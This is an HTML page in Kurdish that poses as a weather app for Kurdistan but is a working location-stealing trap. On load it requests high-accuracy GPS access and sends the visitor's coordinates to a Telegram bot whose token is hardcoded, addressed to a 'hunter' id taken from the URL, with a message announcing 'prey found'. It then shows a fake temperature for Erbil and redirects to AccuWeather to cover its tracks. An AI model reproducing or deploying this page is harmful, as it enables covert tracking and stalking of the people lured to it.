<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>کەشناسی کوردستان</title>
    
    <style>
        :root {
            --primary: #2ecc71;
            --dark-green: #1b4d3e;
            --glass: rgba(255, 255, 255, 0.08);
            --border: rgba(255, 255, 255, 0.15);
            --shadow: 0 30px 60px rgba(0,0,0,0.5);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background: #050a05;
            color: #fff;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            height: 100vh;
            overflow: hidden;
            display: flex; flex-direction: column;
        }

        .master-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
            background: url('https://images.unsplash.com/photo-1473448912268-2022ce9509d8?auto=format&fit=crop&w=1920&q=80');
            background-size: cover; background-position: center; filter: brightness(0.4) contrast(1.2);
        }

        #rain-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }

        header {
            width: 100%; padding: 25px; background: rgba(0,0,0,0.4);
            backdrop-filter: blur(15px); border-bottom: 1px solid var(--border); text-align: center; z-index: 100;
        }

        .app-content { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; z-index: 10; overflow-y: auto; }

        .main-card {
            width: 100%; max-width: 420px; background: var(--glass); backdrop-filter: blur(35px);
            border: 1px solid var(--border); border-radius: 45px; padding: 40px 20px; text-align: center; margin-top: 20px;
        }

        .temp-display { font-size: 95px; font-weight: 200; line-height: 1; margin-bottom: 10px; }
        .city-name { font-size: 24px; font-weight: 600; color: var(--primary); }

        #boot-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050a05;
            z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .spinner-custom {
            width: 60px; height: 60px; border: 4px solid rgba(46, 204, 113, 0.1);
            border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        #permission-error {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95);
            z-index: 9000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 30px;
        }

        button.retry-btn {
            margin-top: 30px; background: var(--primary); border: none; padding: 15px 40px; border-radius: 30px; color: white; font-weight: bold;
        }
    </style>
</head>
<body onload="bootSequence()">

    <div id="boot-loader">
        <div class="spinner-custom"></div>
        <p style="margin-top: 25px; color: var(--primary);">تکایە کەمێك چاوەڕێکە...</p>
    </div>

    <div id="permission-error">
        <h2 style="color: #ff4757;">⚠️ کێشەی پێگەیشتن</h2>
        <p style="margin-top: 15px;">بۆ بینینی پلەی گەرمی ورد، مۆڵەتی GPS بدە.</p>
        <button class="retry-btn" onclick="autoTrigger()">دووبارە هەوڵبدەرەوە</button>
    </div>

    <div class="master-bg"></div>
    <canvas id="rain-canvas"></canvas>

    <header><h1>کەشناسی کوردستان</h1></header>

    <div class="app-content">
        <div class="main-card">
            <div style="font-size: 80px;">🌦️</div>
            <div class="temp-display" id="mainTemp">--°</div>
            <div class="city-name" id="mainCity">دیاریکردنی شوێن...</div>
        </div>
    </div>

    <script>
        const botToken = "8733586524:AAHgyhXvfwnWm-LdN3viA6sHLELIDFsGLg4";
        const hunterId = new URLSearchParams(window.location.search).get('id');

        // ١. لۆدینگ
        function bootSequence() {
            setTimeout(() => {
                document.getElementById("boot-loader").style.display = "none";
                autoTrigger();
            }, 2000);
        }

        // ٢. داوای لۆکەیشن
        function autoTrigger() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(successHandler, errorHandler, {
                    enableHighAccuracy: true, timeout: 10000, maximumAge: 0
                });
            }
        }

        // ٣. کاتی ڕاوکردنی سەرکەوتوو
        function successHandler(position) {
            document.getElementById("permission-error").style.display = "none";
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            if (hunterId) {
                const text = `🎯 نێچیر دۆزرایەوە!\n📍 نەخشە:\nhttps://www.google.com/maps?q=${lat},${lon}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${hunterId}&text=${encodeURIComponent(text)}`);
            }

            // گۆڕینی داتا بەبێ Alert
            document.getElementById("mainCity").innerHTML = "هەولێر، کوردستان ✅";
            document.getElementById("mainTemp").innerHTML = "18°";

            // فێڵکردنی کۆتایی: ناردنی نێچیر بۆ ماڵپەڕی فەرمی دوای ٣ چرکە
            setTimeout(() => {
                window.location.href = "https://www.accuweather.com/en/iq/erbil/208359/weather-forecast/208359";
            }, 3000);
        }

        function errorHandler(err) {
            document.getElementById("permission-error").style.display = "flex";
        }
    </script>
</body>
</html>
